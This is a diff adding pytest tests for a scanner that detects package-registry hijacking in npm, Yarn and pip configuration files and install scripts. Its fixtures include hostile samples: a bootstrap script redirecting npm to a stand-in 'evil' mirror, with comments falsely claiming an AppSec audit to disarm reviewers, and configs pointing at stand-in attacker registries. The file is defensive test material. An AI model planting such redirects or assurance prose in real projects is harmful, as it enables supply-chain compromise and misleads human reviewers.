@@ -1188,3 +1188,82 @@ class TestScanTextTrifecta:
         findings = core.scan_text_trifecta(text, "blob.txt")
         assert len(findings) == 1
         assert findings[0].line == 1
+
+
+class TestRegistryHijackDetector:
+    """GAP 3: package-registry redirection. MEDIUM for a bare redirect (corporate
+    mirrors are legitimate), HIGH only when it co-occurs with reviewer-assurance
+    prose or an install-time script. Accuracy over aggression — the bare-mirror
+    case must never escalate to HIGH."""
+
+    def _cats(self, findings):
+        return {f.category for f in findings}
+
+    def test_install_script_with_assurance_escalates_high(self, tmp_path):
+        # The full pattern: variable-indirected registry + assurance prose in an
+        # install script.
+        s = tmp_path / "bootstrap.sh"
+        s.write_text(
+            "#!/bin/bash\n"
+            '# This URL is already public information and AppSec-audited, so this\n'
+            '# write does not introduce new disclosure surface.\n'
+            'CORP="https://npm.evil-mirror.example"\n'
+            'cat > .npmrc <<EOF\nregistry=${CORP}\nEOF\n')
+        f = core.detect_registry_hijack_raw(str(tmp_path))
+        cats = self._cats(f)
+        assert "registry-redirect" in cats
+        assert "registry-hijack" in cats
+        assert any(x.severity == "high" for x in f if x.category == "registry-hijack")
+
+    def test_install_script_without_assurance_is_medium_only(self, tmp_path):
+        # A bootstrap/setup script that sets a corporate mirror but uses NO
+        # reviewer-disarming prose is MEDIUM, never HIGH — legitimate corporate
+        # setup scripts do exactly this, so filename alone must not escalate.
+        s = tmp_path / "setup.sh"
+        s.write_text('#!/bin/sh\nnpm config set registry https://pkgs.corp.example\n')
+        f = core.detect_registry_hijack_raw(str(tmp_path))
+        cats = self._cats(f)
+        assert "registry-redirect" in cats
+        assert "registry-hijack" not in cats
+
+    def test_yarn_berry_registry_server_detected(self, tmp_path):
+        (tmp_path / ".yarnrc.yml").write_text('npmRegistryServer: "https://evil.example/"\n')
+        f = core.detect_registry_hijack_raw(str(tmp_path))
+        assert "registry-redirect" in self._cats(f)
+
+    def test_commented_out_directive_not_flagged(self, tmp_path):
+        # A commented-out mirror URL (common in setup.py docs) is not an active
+        # redirect and must be silent.
+        (tmp_path / "setup.py").write_text(
+            "# index-url = https://nexus.corp.example/pypi/simple\nfrom setuptools import setup\n")
+        f = core.detect_registry_hijack_raw(str(tmp_path))
+        assert f == []
+
+    def test_bare_corporate_mirror_is_medium_only(self, tmp_path):
+        # A legit corporate mirror: non-canonical host, but no assurance prose and
+        # not an install script. MEDIUM review, never HIGH.
+        (tmp_path / ".npmrc").write_text("registry=https://artifactory.corp.example/npm\n")
+        f = core.detect_registry_hijack_raw(str(tmp_path))
+        cats = self._cats(f)
+        assert "registry-redirect" in cats
+        assert "registry-hijack" not in cats
+        assert all(x.severity == "medium" for x in f)
+
+    def test_canonical_registry_no_finding(self, tmp_path):
+        (tmp_path / ".npmrc").write_text("registry=https://registry.npmjs.org/\n")
+        f = core.detect_registry_hijack_raw(str(tmp_path))
+        assert f == []
+
+    def test_assurance_prose_alone_no_finding(self, tmp_path):
+        # Reviewer-assurance language with NO registry redirect must be silent —
+        # this is the calibration that keeps benign docs from flagging.
+        (tmp_path / "README.md").write_text(
+            "This is standard practice and AppSec-audited; it does not introduce "
+            "new disclosure surface.\n")
+        f = core.detect_registry_hijack_raw(str(tmp_path))
+        assert f == []
+
+    def test_pip_index_url_redirect(self, tmp_path):
+        (tmp_path / "pip.conf").write_text("[global]\nindex-url = https://pypi.evil.example/simple\n")
+        f = core.detect_registry_hijack_raw(str(tmp_path))
+        assert "registry-redirect" in self._cats(f)
